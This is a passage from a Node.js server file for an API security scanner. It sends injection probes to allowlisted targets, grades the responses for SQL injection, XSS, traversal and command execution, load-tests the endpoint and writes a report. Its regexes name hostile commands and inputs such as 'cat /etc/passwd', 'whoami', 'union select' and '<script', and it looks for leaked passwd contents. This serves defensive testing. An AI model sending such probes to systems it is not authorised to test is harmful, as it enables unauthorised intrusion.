    /(\bor\b|\band\b)\s+\d=\d/,
    /union\s+select/,
    /drop\s+table/,
    /waitfor\s+delay/,
    /<script|onerror=|onload=|javascript:/,
    /\.\.\/|%2e%2e%2f|%252f/,
    /\$ne|\$gt|\$regex/,
    /%00|\x00/,
    /\{\{.*\}\}|\$\{.*\}/,
    /\r\n|%0d%0a/,
    /cat\s+\/etc\/passwd|whoami|cmd\.exe|powershell/,
  ];
  return patterns.some((re) => re.test(s));
}

function hasXssLikePayload(value) {
  const s = String(value || "").toLowerCase();
  return /<script|onerror=|onload=|javascript:|<svg|<img/i.test(s);
}

function hasCommandOrTraversalPayload(value) {
  const s = String(value || "").toLowerCase();
  return /cat\s+\/etc\/passwd|whoami|cmd\.exe|powershell|\.\.\/|%2e%2e%2f|%252f|%00|\x00/.test(s);
}

function detectConfirmedExecutionEvidence(responseText) {
  const text = String(responseText || "");
  if (!text) return { confirmed: false, reason: "" };
  const lowered = text.toLowerCase();

  if (/root:x:0:0:|daemon:x:|\/bin\/bash/.test(text)) {
    return { confirmed: true, reason: "Odgovor sadrzi sadrzaj osjetljivih sistemskih fajlova (npr. /etc/passwd)." };
  }
  if (/uid=\d+\(.+\)\s+gid=\d+\(.+\)/.test(text)) {
    return { confirmed: true, reason: "Odgovor sadrzi izlaz sistemske komande (uid/gid)." };
  }
  if (/\[extensions\]|\[fonts\]|\[mci extensions\]/i.test(text)) {
    return { confirmed: true, reason: "Odgovor izgleda kao sadrzaj osjetljivog konfiguracionog fajla (win.ini)." };
  }
  if (lowered.includes("information_schema") || lowered.includes("pg_catalog") || lowered.includes("sqlite_master")) {
    return { confirmed: true, reason: "Odgovor sadrzi DB metapodatke koji ukazuju na injekciju." };
  }
  if (lowered.includes("/etc/passwd") || /root:x:0:0:/.test(text)) {
    return { confirmed: true, reason: "Odgovor sadrzi sadrzaj /etc/passwd ili osjetljive putanje." };
  }
  if (hasSqlErrorMarkers(text)) {
    return { confirmed: true, reason: "Odgovor sadrzi SQL error poruke." };
  }

  return { confirmed: false, reason: "" };
}

function getResponseContentType(response) {
  try {
    return String(response?.headers?.get("content-type") || "").toLowerCase();
  } catch (e) {
    return "";
  }
}

function tryParseJson(text) {
  try {
    return JSON.parse(String(text || ""));
  } catch (e) {
    return null;
  }
}

function stableStringify(value) {
  if (value === null || value === undefined) return String(value);
  if (typeof value !== "object") return JSON.stringify(value);
  if (Array.isArray(value)) return `[${value.map((v) => stableStringify(v)).join(",")}]`;
  const keys = Object.keys(value).sort();
  return `{${keys.map((k) => `${JSON.stringify(k)}:${stableStringify(value[k])}`).join(",")}}`;
}

function stripVolatileFields(value, depth = 0) {
  if (depth > 6 || value === null || value === undefined) return value;
  if (Array.isArray(value)) return value.slice(0, 100).map((v) => stripVolatileFields(v, depth + 1));
  if (typeof value !== "object") return value;

  const out = {};
  const volatileKey = /(timestamp|generatedat|requestid|traceid|correlationid|nonce|signature|expiresat|createdat|updatedat)/i;
  for (const key of Object.keys(value)) {
    if (volatileKey.test(key)) continue;
    out[key] = stripVolatileFields(value[key], depth + 1);
  }
  return out;
}

function hasEquivalentBody(baselineText, responseText) {
  const sameRaw = normalizeBody(baselineText) === normalizeBody(responseText);
  if (sameRaw) return true;

  const baseJson = tryParseJson(baselineText);
  const currJson = tryParseJson(responseText);
  if (!baseJson || !currJson) return false;

  const baseComparable = stripVolatileFields(baseJson);
  const currComparable = stripVolatileFields(currJson);
  return stableStringify(baseComparable) === stableStringify(currComparable);
}

function detectApplicationLevelBlock(responseText) {
  const text = String(responseText || "");
  if (!text) return { blocked: false, reason: "" };

  const lowered = text.toLowerCase();
  const phrases = [
    "invalid input",
    "input validation",
    "not allowed",
    "forbidden",
    "access denied",
    "request blocked",
    "malicious",
    "suspicious",
    "waf",
    "nevalid",
    "nedozvolj",
    "zabranjen",
    "odbijen",
    "too many requests",
  ];

  if (phrases.some((p) => lowered.includes(p))) {
    return { blocked: true, reason: "Response text indicates the request was blocked." };
  }

  const json = tryParseJson(text);
  if (json && typeof json === "object") {
    if (json.ok === false || json.success === false || json.blocked === true || json.allowed === false) {
      return { blocked: true, reason: "JSON fields indicate the request was blocked." };
    }
    const errText = String(json.error || json.message || "").toLowerCase();
    if (errText && phrases.some((p) => errText.includes(p))) {
      return { blocked: true, reason: "JSON message indicates the request was blocked." };
    }
  }

  return { blocked: false, reason: "" };
}

function isBaselineBlocked(baseline) {
  if (!baseline) return false;
  const status = Number(baseline.statusCode || 0);
  if (isExplicitBlockStatus(status)) return true;
  if (status >= 400 && status < 500) return true;
  return baseline.blocked === true;
}

function getBaselineComparison(baseline, responseText, responseStatus) {
  const valid = baseline?.valid || null;
  const invalid = baseline?.invalid || null;
  const simValid = valid ? computeSimilarityScore(valid.text, responseText) : null;
  const simInvalid = invalid ? computeSimilarityScore(invalid.text, responseText) : null;
  const validStatus = valid ? Number(valid.statusCode || 0) : null;
  const invalidStatus = invalid ? Number(invalid.statusCode || 0) : null;
  const sameStatusAsValid = validStatus !== null ? responseStatus === validStatus : null;
  const sameStatusAsInvalid = invalidStatus !== null ? responseStatus === invalidStatus : null;
  const invalidBlocked = isBaselineBlocked(invalid);
  const diffScore = simValid !== null && simInvalid !== null ? Math.abs(simValid - simInvalid) : 0;
  const invalidLooksMeaningful = Boolean(invalid) && (invalidBlocked || diffScore >= 0.1);
  return {
    valid,
    invalid,
    simValid,
    simInvalid,
    validStatus,
    invalidStatus,
    sameStatusAsValid,
    sameStatusAsInvalid,
    invalidBlocked,
    invalidLooksMeaningful,
  };
}

function classify2xxWithBaseline({ response, responseText, baseline, method, value, elapsedMs }) {
  const writeMethod = ["POST", "PUT", "PATCH"].includes(String(method || "").toUpperCase());
  const suspicious = hasSuspiciousMarkers(value);
  const baselineValid = baseline?.valid || baseline || null;
  const baselineInvalid = baseline?.invalid || null;
  const baselineMs = Number(baselineValid?.elapsedMs || 0);
  const baselineInvalidMs = Number(baselineInvalid?.elapsedMs || 0);
  const isTimeProbe = hasTimeInjectionMarker(value);
  const baselineDelay = Math.max(baselineMs, baselineInvalidMs);
  const suspiciousDelay =
    isTimeProbe && elapsedMs > Math.max(TIME_MIN_DELAY_MS, baselineDelay + TIME_DELAY_THRESHOLD_MS);
  const timeHighRisk = baselineDelay > 0 && elapsedMs > baselineDelay * 3;

  if (timeHighRisk) {
    return buildVerdict({
      status: "Failed",
      findingType: "High Risk Delay",
      severity: "High",
      note: `Response time ${elapsedMs} ms exceeds baseline x3 (${baselineDelay} ms).`,
      message: "Time-based scoring indicates high risk of time-based vulnerability.",
    });
  }

  if (suspiciousDelay) {
    return buildVerdict({
      status: "Failed",
      findingType: "Confirmed Vulnerability",
      severity: "Critical",
      note: `Possible time-based injection (response ${elapsedMs} ms, baseline ${baselineDelay} ms).`,
      message: "Time-based payload caused a significant delay.",
    });
  }

  if (!baselineValid) {
    if (suspicious) {
      return buildVerdict({
        status: "Failed",
        findingType: "Possible Vulnerability",
        severity: "Medium",
        note: "No baseline, and a suspicious payload returned 2xx without blocking signals.",
        message: "The API likely processed a suspicious payload without explicit protection.",
      });
    }
    return buildVerdict({
      status: "Inconclusive",
      findingType: "Unclassified Behavior",
      severity: "Informational",
      note: "No baseline comparison for precise classification of 2xx response.",
      message: "Result is inconclusive without a reference response.",
    });
  }

  const baselineCompare = getBaselineComparison(baseline, responseText, Number(response.status));
  if (baselineCompare.invalidLooksMeaningful && suspicious) {
    if (
      baselineCompare.sameStatusAsValid &&
      baselineCompare.simValid !== null &&
      baselineCompare.simInvalid !== null &&
      baselineCompare.simValid > baselineCompare.simInvalid + DIFF_SIMILARITY_THRESHOLD
    ) {
      return buildVerdict({
        status: "Failed",
        findingType: "Possible Vulnerability",
        severity: "Medium",
        note: "Suspicious payload response is closer to valid input than invalid input.",
        message: "Valid vs invalid baseline indicates the payload was accepted.",
      });
    }
    if (
      baselineCompare.invalidBlocked &&
      baselineCompare.sameStatusAsInvalid &&
      baselineCompare.simValid !== null &&
      baselineCompare.simInvalid !== null &&
      baselineCompare.simInvalid >= baselineCompare.simValid + 0.1
    ) {
      return buildVerdict({
        status: "Passed",
        findingType: "Request Blocked",
        severity: "Low",
        note: "Response matches invalid-input baseline, indicating rejection.",
        message: "Payload was blocked based on valid vs invalid input comparison.",
      });
    }
  }

  const currentStatus = Number(response.status);
  const baselineStatus = Number(baselineValid.statusCode);
  const sameStatus = currentStatus === baselineStatus;
  const sameBody = hasEquivalentBody(baselineValid.text, responseText);

  if (sameStatus && sameBody) {
    return buildVerdict({
      status: "Passed",
      findingType: "Parameter Ignored",
      severity: "Low",
      note: "Response matches baseline; parameter appears ignored.",
      message: "Input did not affect the response.",
    });
  }

  if (!sameStatus && baselineStatus >= 200 && baselineStatus < 300 && isExplicitBlockStatus(currentStatus)) {
    return buildVerdict({
      status: "Passed",
      findingType: "Request Blocked",
      severity: "Low",
      note: `Server shifted from baseline status ${baselineStatus} to explicit rejection ${currentStatus}.`,
      message: "Payload was detected and blocked.",
    });
  }

  if (writeMethod && suspicious) {
    return buildVerdict({
      status: "Failed",
      findingType: "Possible Vulnerability",
      severity: "Medium",
      note: "Suspicious payload changed the write response without clear blocking.",
      message: "POST/PUT/PATCH processed risky input and returned a modified response.",
    });
  }

  if (suspicious) {
    return buildVerdict({
      status: "Failed",
      findingType: "Possible Vulnerability",
      severity: "Medium",
      note: "Suspicious payload returned 2xx and modified the response without clear blocking.",
      message: "The API likely processed suspicious input instead of rejecting it.",
    });
  }

  if (sameStatus && !sameBody) {
    return buildVerdict({
      status: "Passed",
      findingType: "Safe 2xx Variation",
      severity: "Low",
      note: "Response differs from baseline, but without exploit signals.",
      message: "The API responded differently without direct vulnerability indicators.",
    });
  }

  return buildVerdict({
    status: "Inconclusive",
    findingType: "Reflected/Changed Response",
    severity: "Informational",
    note: "Response differs from baseline without clear blocking or exploit signals.",
    message: "Additional validation of logs or business logic is needed.",
  });
}

function evaluate({ value, response, responseText, baseline, method, elapsedMs }) {
  const methodName = String(method || "").toUpperCase();
  const contentType = getResponseContentType(response);
  if (!response) return buildVerdict({ status: "Failed", findingType: "Transport Error", severity: "Medium", note: "No server response.", message: "Server did not respond." });
  if (response.status >= 500) return buildVerdict({ status: "Failed", findingType: "Server Error", severity: "High", note: "Server error (5xx).", message: "Server error - payload triggered an error." });
  if (isExplicitBlockStatus(response.status)) return buildVerdict({ status: "Passed", findingType: "Request Blocked", severity: "Low", note: `Server explicitly rejected the payload (${response.status}).`, message: "Payload blocked, protection works." });
  if (response.status >= 400 && response.status < 500) return buildVerdict({ status: "Passed", findingType: "Request Blocked", severity: "Low", note: `Server rejected the payload (${response.status}).`, message: "Payload blocked." });
  if (response.status >= 300 && response.status < 400) {
    const redirectVerdict = ["POST", "PUT", "PATCH"].includes(methodName) ? "Inconclusive" : "Passed";
    return buildVerdict({
      status: redirectVerdict,
      findingType: redirectVerdict === "Passed" ? "Redirect Handling" : "Unclassified Redirect",
      severity: "Informational",
      note: `Server returned a redirect (${response.status}).`,
      message: redirectVerdict === "Passed"
        ? "Payload was not directly accepted as successful input."
        : "Check the redirect destination and backend flow.",
    });
  }
  if (response.status >= 200 && response.status < 300) {
    if (hasSqlErrorMarkers(responseText)) {
      return buildVerdict({
        status: "Failed",
        findingType: "Possible Vulnerability",
        severity: "Medium",
        note: "SQL error markers detected in the response.",
        message: "Response contains messages that indicate possible SQL injection.",
      });
    }

    const appBlock = detectApplicationLevelBlock(responseText);
    if (appBlock.blocked) {
      return buildVerdict({
        status: "Passed",
        findingType: "Request Blocked",
        severity: "Low",
        note: appBlock.reason,
        message: "Application blocked the payload even though HTTP status is 2xx.",
      });
    }

    const exploitEvidence = detectConfirmedExecutionEvidence(responseText);
    if (exploitEvidence.confirmed) {
      return buildVerdict({
        status: "Failed",
        findingType: "Confirmed Vulnerability",
        severity: "Critical",
        note: exploitEvidence.reason,
        message: "Response contains strong evidence that the payload executed.",
      });
    }

    if (contentType.includes("text/html") && looksReflected(responseText, value)) {
      return buildVerdict({
        status: "Failed",
        findingType: "HTML Rendered",
        severity: "High",
        note: "Payload reflected within HTML response.",
        message: "HTML rendering with reflected input indicates possible XSS risk.",
      });
    }

    if (looksEscapedReflection(responseText, value)) {
      return buildVerdict({
        status: "Passed",
        findingType: "Escaped Reflection",
        severity: "Low",
        note: "Payload was reflected but escaped in the response.",
        message: "Reflection appears safe (output escaping).",
      });
    }

    if (looksReflected(responseText, value)) {
      const reflectedXssInHtml = hasXssLikePayload(value) && contentType.includes("text/html");
      if (reflectedXssInHtml) {
        return buildVerdict({
          status: "Failed",
          findingType: "Possible Vulnerability",
          severity: "High",
          note: "XSS payload was reflected in HTML without escaping.",
          message: "High risk of reflected XSS vulnerability.",
        });
      }

      if (hasCommandOrTraversalPayload(value)) {
        return buildVerdict({
          status: "Failed",
          findingType: "Possible Vulnerability",
          severity: "Medium",
          note: "Suspicious payload was reflected without clear blocking.",
          message: "API returned risky input; possible unsafe input handling.",
        });
      }

      return buildVerdict({
        status: "Inconclusive",
        findingType: "Reflected Input",
        severity: "Informational",
        note: "Payload was reflected in the response.",
        message: "Input was returned in the response; without more evidence this is not automatically an exploit.",
      });
    }
    return classify2xxWithBaseline({ response, responseText, baseline, method: methodName, value, elapsedMs });
  }
  return buildVerdict({ status: "Failed", findingType: "Unexpected Response", severity: "Medium", note: `Unexpected status (${response.status}).`, message: "Invalid server response." });
}

function runAutocannon(options) {
  return new Promise((resolve, reject) => {
    autocannon(options, (err, res) => {
      if (err) reject(err);
      else {
        res.errors = res.errors || 0;
        res.timeouts = res.timeouts || 0;
        res.latency = res.latency || {};
        res.requests = res.requests || {};
        res.throughput = res.throughput || {};
        res.bytes = res.bytes || {};
        res["1xx"] = res["1xx"] || 0;
        res["2xx"] = res["2xx"] || 0;
        res["3xx"] = res["3xx"] || 0;
        res["4xx"] = res["4xx"] || 0;
        res["5xx"] = res["5xx"] || 0;
        resolve(res);
      }
    });
  });
}

function pickPhrase(list, seed) {
  if (!Array.isArray(list) || list.length === 0) return "";
  return list[Math.abs(seed) % list.length];
}

function generateAnalysisSummary({ summary, performance, findings }) {
  const failed = Number(summary?.failed || 0);
  const inconclusive = Number(summary?.inconclusive || 0);
  const total = Number(summary?.totalTests || 0);
  const securityScore = Number(summary?.securityScore || 0);
  const avgLatency = Number(performance?.avgLatencyMs || 0);
  const p99 = Number(performance?.latencyP99 || 0);
  const reqPerSec = Number(performance?.requestsPerSec || 0);
  const errorCount = Number(performance?.errorCount || 0);
  const totalRequests = Number(performance?.totalRequests || 0);
  const errorRate = totalRequests > 0 ? ((errorCount / totalRequests) * 100) : 0;
  const findingsList = Array.isArray(findings) ? findings : [];
  const failedRatio = total > 0 ? failed / total : 0;
  const inconclusiveRatio = total > 0 ? inconclusive / total : 0;

  let securityRiskLevel = "Low";
  if (failedRatio >= 0.5) securityRiskLevel = "High";
  else if (failedRatio > 0 || inconclusiveRatio > 0 || securityScore < 100) securityRiskLevel = "Medium";

  // securityLevel indicates protection strength (High = good security, Low = weak security)
  let securityLevel = "High";
  if (securityRiskLevel === "High") securityLevel = "Low";
  else if (securityRiskLevel === "Medium") securityLevel = "Medium";

  let performanceLevel = "Good";
  if (p99 >= 1200 || errorRate >= 1.0) performanceLevel = "Poor";
  else if (p99 >= 500 || avgLatency >= 250 || reqPerSec < 10) performanceLevel = "Moderate";

  let priority = "Low";
  if (securityRiskLevel === "High" || performanceLevel === "Poor") priority = "High";
  else if (securityRiskLevel === "Medium" || performanceLevel === "Moderate") priority = "Medium";

  const failedByType = {
    sql: findingsList.filter((f) => f?.status === "Failed" && /sqli|sql/i.test(String(f?.testType || ""))).length,
    xss: findingsList.filter((f) => f?.status === "Failed" && /xss|script|html/i.test(String(f?.testType || ""))).length,
    overlong: findingsList.filter((f) => f?.status === "Failed" && /overlong|long|traversal|path/i.test(String(f?.testType || ""))).length,
  };

  const seed = failed * 13 + Math.round(p99) + Math.round(reqPerSec * 3);
  const headline = pickPhrase(
    securityRiskLevel === "High"
      ? [
          "High security risk detected for this endpoint",
          "Results indicate critical weaknesses in input protection",
          "Endpoint requires urgent security hardening",
        ]
      : securityRiskLevel === "Medium"
      ? [
          "Medium security risk detected for this endpoint",
          "Security weaknesses were found and should be remediated",
          "Endpoint needs additional validation hardening",
        ]
      : [
          "Endpoint security profile is stable",
          "No critical security deviations detected",
          "Endpoint passes the defined security checks",
        ],
    seed
  );

  const dominantVector = failedByType.sql >= failedByType.xss && failedByType.sql >= failedByType.overlong
    ? "SQLi"
    : failedByType.xss >= failedByType.overlong
    ? "XSS"
    : "Overlong/Traversal";

  const securityAssessment =
    failedRatio >= 0.66
      ? pickPhrase(
          [
            `Most security tests failed (${failed}/${total}), indicating insufficient input validation and sanitization.`,
            `Failure rate is high (${failed}/${total}), with dominant risk in ${dominantVector}.`,
            `Endpoint currently accepts risky payloads (${failed}/${total} failed), requiring urgent input control fixes.`,
          ],
          seed + failedByType.sql + failedByType.xss
        )
      : failedRatio === 0 && inconclusiveRatio > 0
      ? pickPhrase(
          [
            `No direct test failures, but ${inconclusive}/${total} results are inconclusive and need additional review.`,
            `Inconclusive outcomes detected (${inconclusive}/${total}) without clear evidence of blocking or exploit.`,
            `Result is partially inconclusive (${inconclusive}/${total}); additional backend checks are needed.`,
          ],
          seed + 9
        )
      : failedRatio > 0
      ? pickPhrase(
          [
            `Some security tests failed (${failed}/${total}); targeted input validation improvements are recommended.`,
            `Partial weaknesses detected (${failed}/${total} failed) without full compromise of all tests.`,
            `Mixed result (${failed}/${total}); endpoint works but has specific security gaps.`,
          ],
          seed + 5
        )
      : pickPhrase(
          [
            "Security result is good: no deviations found in covered test scenarios.",
            "Endpoint rejected tested risky patterns and maintained a good security profile.",
            "Core security controls appear reliable and results indicate good endpoint security.",
          ],
          seed + 3
        );

  const performanceAssessment =
    performanceLevel === "Poor"
      ? pickPhrase(
          [
            `Performance is unstable under load (P99 ${p99.toFixed(0)} ms) with elevated tail latency.`,
            `Response degradation observed under peak load; tail latency is higher.`,
            `Performance profile is weak for peak requests and needs processing optimization.`,
          ],
          seed + 11
        )
      : performanceLevel === "Moderate"
      ? pickPhrase(
          [
            "Performance is acceptable with occasional fluctuations; continuous monitoring is recommended.",
            "Service is stable for basic load, but there is room for better P99 response.",
            "No critical errors, but tuning is recommended for more consistent response.",
          ],
          seed + 17
        )
      : pickPhrase(
          [
            "Performance is stable and consistent for the current load profile.",
            "Service response is healthy without significant degradation during the test.",
            "No indication of a serious performance bottleneck for this scenario.",
          ],
          seed + 23
        );

  const recommendations = [];
  if (failedByType.sql > 0) recommendations.push("Priority 1: add strict server-side validation and schema enforcement for query/body parameters.");
  if (failedByType.xss > 0) recommendations.push("Priority 1: prevent raw input reflection and apply output escaping.");
  if (failedByType.overlong > 0) recommendations.push("Priority 2: limit payload size and filter traversal patterns.");
  if (inconclusive > 0) recommendations.push("Priority 2: review backend logs and validation rules for inconclusive tests.");
  if (performanceLevel !== "Good" && failed > 0) recommendations.push("Priority 2: optimize critical routes to reduce P99 latency.");
  if (performanceLevel !== "Good" && failed === 0) recommendations.push("Optional: optimize P99 latency for more stable response under load.");
  if (recommendations.length === 0) recommendations.push("Keep existing controls and continue periodic security/performance retesting.");

  const conclusion = pickPhrase(
    priority === "High"
      ? [
          "Urgent remediation is recommended before wider endpoint use.",
          "A priority remediation plan is required before production use.",
          "Endpoint is not ready for production without additional safeguards.",
        ]
      : failed === 0 && inconclusive === 0
      ? [
          "Endpoint security is good for covered test scenarios; regular monitoring is recommended.",
          "Endpoint shows a good security profile with continued periodic testing.",
          "Result is good and usable with standard operational controls.",
        ]
      : failed === 0 && inconclusive > 0
      ? [
          "No direct security failures, but inconclusive outcomes require additional verification.",
          "Result is moderately reliable; log review and retest are recommended.",
          "Endpoint may be stable, but inconclusive signals need deeper review.",
        ]
      : [
          "State is usable with regular monitoring and periodic retest.",
          "Endpoint is stable with a recommendation for continuous testing.",
          "Result is acceptable for a test environment with standard controls.",
        ],
    seed + 7
  );

  const summaryText = `${headline}. ${securityAssessment} ${performanceAssessment} ${conclusion}`;

  return {
    headline,
    priority,
    securityLevel,
    performanceLevel,
    securityAssessment,
    performanceAssessment,
    recommendations: recommendations.slice(0, 3),
    conclusion,
    summary: summaryText,
  };
}

app.post("/run-test", runTestLimiter, async (req, res) => {
  if (isIpBanned(req.ip)) {
    safeAppendAudit({ event: "run_test_denied", reason: "ip_banned", ip: req.ip });
    return res.status(403).json({ error: "Access temporarily blocked." });
  }
  if (isDailyLimitReached("test", req.ip, DAILY_TEST_LIMIT)) {
    safeAppendAudit({ event: "run_test_denied", reason: "daily_test_limit", ip: req.ip });
    return res.status(429).json({ error: "Daily test limit reached." });
  }
  if (activeTests >= MAX_ACTIVE_TESTS) {
    return res.status(429).json({
      error: "Too many active tests. Please try again later."
    });
  }

  activeTests++;

  try {
    const raw = req.body || {};
    const baseUrl = sanitizeString(raw.baseUrl || "", 2048);
    const path = sanitizeString(raw.path || "", 1024);
    const method = sanitizeString(raw.method || "", 10).toUpperCase();
    const apiToken = String(req.get("x-api-token") || raw.apiKeyToken || getCookie(req, "api_token") || "").trim();
    const endpointContext = sanitizeObject(raw.endpointContext || {});
    const swaggerUrl = sanitizeString(raw.swaggerUrl || "", 2048);

    if (!baseUrl || !path || !method) return res.status(400).json({ error: "Missing parameters" });
    if (!isValidUrl(baseUrl)) return res.status(400).json({ error: "Invalid baseUrl" });
    if (swaggerUrl && !isValidUrl(swaggerUrl)) {
      return res.status(400).json({ error: "Invalid swaggerUrl" });
    }
    if (!await enforceAllowedTarget(baseUrl, swaggerUrl)) {
      safeAppendAudit({
        event: "run_test_denied",
        reason: "target_not_allowed",
        ip: req.ip,
        baseUrl,
        swaggerUrl,
      });
      noteDenied(req.ip, "target_not_allowed", { baseUrl });
      console.warn(`[audit] target_not_allowed ip=${req.ip} baseUrl=${baseUrl}`);
      return res.status(403).json({ error: "Target host not allowed." });
    }
    if (!["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"].includes(method)) return res.status(400).json({ error: "Invalid method" });
    if (!apiToken) {
      noteDenied(req.ip, "missing_token");
      return res.status(403).json({ error: "Missing API key." });
    }
    pruneExpiredTokens();
    const tokenData = issuedTokens.get(apiToken);
    if (!tokenData) {
      safeAppendAudit({ event: "run_test_denied", reason: "invalid_token", ip: req.ip, baseUrl });
      noteDenied(req.ip, "invalid_token", { baseUrl });
      return res.status(403).json({ error: "Invalid or expired API key." });
    }
    if (tokenData.ip && tokenData.ip !== req.ip) {
      safeAppendAudit({
        event: "run_test_denied",
        reason: "ip_mismatch",
        ip: req.ip,
        baseUrl,
      });
      noteDenied(req.ip, "ip_mismatch", { baseUrl });
      return res.status(403).json({ error: "API key not valid for this client." });
    }
    const currentUa = String(req.get("user-agent") || "").trim();
    if (tokenData.ua && currentUa && tokenData.ua !== currentUa) {
      safeAppendAudit({
        event: "run_test_denied",
        reason: "ua_mismatch",
        ip: req.ip,
        baseUrl,
        ua: currentUa,
      });
      noteDenied(req.ip, "ua_mismatch", { baseUrl });
      return res.status(403).json({ error: "API key not valid for this client." });
    }
    const csrfHeader = String(req.get("x-csrf-token") || "").trim();
    if (!csrfHeader || csrfHeader !== tokenData.csrfToken) {
      safeAppendAudit({
        event: "run_test_denied",
        reason: "csrf_mismatch",
        ip: req.ip,
        baseUrl,
      });
      noteDenied(req.ip, "csrf_mismatch", { baseUrl });
      return res.status(403).json({ error: "CSRF validation failed." });
    }
    const normalizedMethod = method.toUpperCase();
    safeAppendAudit({
      event: "run_test_started",
      ip: req.ip,
      baseUrl,
      method: normalizedMethod,
    });
    bumpDailyCounter("test", req.ip, DAILY_TEST_LIMIT);
    const mode = chooseMode(normalizedMethod, endpointContext);
    const tests = testsByMode[mode] || testsByMode.body;
    const basePathParams = endpointContext?.pathParamValues || {};
    const defaultPath = resolvePath(path, basePathParams);
    const baseTargetUrl = joinUrl(baseUrl, defaultPath);
    const queryNames = mode === "query" ? (endpointContext?.queryParams || []) : [];
    const useProbeQuery = mode === "query" && queryNames.length === 0;
    const results = [];

    let baseline = null;
    try {
      const baselineUrl = buildUrl(baseUrl, defaultPath, queryNames, "test", useProbeQuery);
      const baselineOptions = buildRequest(normalizedMethod, mode, "test", endpointContext);
      const baselineStartedAt = Date.now();
      const baselineResponse = await fetchWithTimeout(baselineUrl, baselineOptions);
      const baselineText = await baselineResponse.text().catch(() => "");
      const baselineBlock = detectApplicationLevelBlock(baselineText);
      const validBaseline = {
        statusCode: baselineResponse.status,
        text: baselineText,
        elapsedMs: Date.now() - baselineStartedAt,
        blocked: baselineBlock.blocked,
      };

      const invalidValue = getInvalidProbeValue(mode);
      const invalidUrl = buildUrl(baseUrl, defaultPath, queryNames, invalidValue, useProbeQuery);
      const invalidOptions = buildRequest(normalizedMethod, mode, invalidValue, endpointContext);
      const invalidStartedAt = Date.now();
      const invalidResponse = await fetchWithTimeout(invalidUrl, invalidOptions);
      const invalidText = await invalidResponse.text().catch(() => "");
      const invalidBlock = detectApplicationLevelBlock(invalidText);
      const invalidBaseline = {
        statusCode: invalidResponse.status,
        text: invalidText,
        elapsedMs: Date.now() - invalidStartedAt,
        blocked: invalidBlock.blocked,
      };

      baseline = { valid: validBaseline, invalid: invalidBaseline };
    } catch (e) {
      baseline = null;
    }

    const chainedTests = buildChainedTests(tests);
    const allTests = tests.concat(chainedTests);

    for (const test of allTests) {
      try {
        const pathValues = { ...basePathParams };
        if (mode === "path") {
          const firstPathKey = Object.keys(pathValues)[0];
          if (firstPathKey) pathValues[firstPathKey] = test.value;
        }

        const resolvedPath = resolvePath(path, pathValues);
        const targetUrl = buildUrl(baseUrl, resolvedPath, queryNames, test.value, useProbeQuery);
        const options = buildRequest(normalizedMethod, mode, test.value, endpointContext);
        const startedAt = Date.now();
        const response = await fetchWithTimeout(targetUrl, options);
        const text = await response.text().catch(() => "");
        const elapsedMs = Date.now() - startedAt;
        const verdict = evaluate({
          value: test.value,
          response,
          responseText: text,
          baseline,
          method: normalizedMethod,
          elapsedMs,
        });

        const diffVsValid = baseline?.valid ? computeResponseDiff(baseline.valid.text, text) : null;
        const diffVsInvalid = baseline?.invalid ? computeResponseDiff(baseline.invalid.text, text) : null;
        const baselineCompare = getBaselineComparison(baseline, text, response.status);

        results.push({
          type: test.type,
          payload: test.value,
          chainedFrom: test.chainedFrom || null,
          status: verdict.status,
          findingType: verdict.findingType || null,
          severity: verdict.severity || null,
          note: verdict.note,
          response: { message: verdict.message, raw: text, statusCode: response.status },
          diff: {
            vsValid: diffVsValid,
            vsInvalid: diffVsInvalid,
            similarityToValid: baselineCompare.simValid,
            similarityToInvalid: baselineCompare.simInvalid,
          },
          timestamp: new Date().toISOString(),
          url: targetUrl,
          method: normalizedMethod,
          elapsedMs,
        });
      } catch (err) {
        results.push({
          type: test.type,
          payload: test.value,
          status: "Failed",
          findingType: "Transport Error",
          severity: "Medium",
          note: "Connection or payload processing error.",
          response: { message: err.message, raw: "", statusCode: null },
          timestamp: new Date().toISOString(),
          url: baseTargetUrl,
          method: normalizedMethod,
          elapsedMs: null,
        });
      }
    }

    const firstTest = tests[0] || { value: "test" };
    const loadPathValues = { ...basePathParams };
    if (mode === "path") {
      const firstPathKey = Object.keys(loadPathValues)[0];
      if (firstPathKey) loadPathValues[firstPathKey] = firstTest.value;
    }

    const loadResolvedPath = resolvePath(path, loadPathValues);
    const loadTargetUrl = buildUrl(
      baseUrl,
      loadResolvedPath,
      queryNames,
      firstTest.value,
      useProbeQuery
    );

    const options = buildRequest(normalizedMethod, mode, firstTest.value, endpointContext);
    const loadOpts = {
      url: loadTargetUrl,
      method: normalizedMethod,
      connections: 10,
      amount: 200,
      timeout: 10,
      headers: options.headers || {},
      body: options.body || undefined,
    };

    let load;
    try {
      load = await runAutocannon(loadOpts);
    } catch (err) {
      load = { latency: {}, requests: {}, throughput: {}, bytes: {}, errors: 1, timeouts: 0 };
    }

    const passed = results.filter((item) => item.status === "Passed").length;
    const failed = results.filter((item) => item.status === "Failed").length;
    const inconclusive = results.filter((item) => item.status === "Inconclusive").length;
    const criticalFindings = results.filter((item) => item.severity === "Critical").length;
    const mediumHighFindings = results.filter((item) => item.severity === "High" || item.severity === "Medium").length;
    const totalTests = results.length;
    const securityScore = totalTests === 0 ? 0 : Math.round(((passed + inconclusive * 0.85) / totalTests) * 100);
    const totalLoadRequests = load.requests?.total || 0;
    const status2xx = load["2xx"] || 0;
    const successRatePct = totalLoadRequests === 0 ? "0.00" : ((status2xx / totalLoadRequests) * 100).toFixed(2);

    const report = {
      title: "API Security Test Report",
      generatedAt: new Date().toISOString(),
      endpoint: { url: baseTargetUrl, method: normalizedMethod },
      summary: {
        totalTests,
        passed,
        failed,
        inconclusive,
        securityScore,
        riskLevel: criticalFindings > 0 ? "High" : mediumHighFindings > 0 ? "Medium" : "Low",
      },
      performance: {
        avgLatencyMs: (load.latency?.average || 0).toFixed(2),
        latencyMinMs: (load.latency?.min || 0).toFixed(2),
        latencyP50: (load.latency?.p50 || 0).toFixed(2),
        latencyP90: (load.latency?.p90 || 0).toFixed(2),
        latencyP99: (load.latency?.p99 || 0).toFixed(2),
        latencyMaxMs: (load.latency?.max || 0).toFixed(2),
        requestsPerSec: (load.requests?.average || 0).toFixed(2),
        throughputKbPerSec: ((load.throughput?.average || 0) / 1024).toFixed(2),
        totalRequests: totalLoadRequests,
        status2xx: status2xx,
        status4xx: load["4xx"] || 0,
        status5xx: load["5xx"] || 0,
        successRatePct: successRatePct,
        errorCount: load.errors ?? 0,
        timeouts: load.timeouts ?? 0,
        totalBytes: load.bytes?.total || 0,
      },
      findings: results.map((item) => ({
        testType: item.type,
        chainedFrom: item.chainedFrom || null,
        status: item.status,
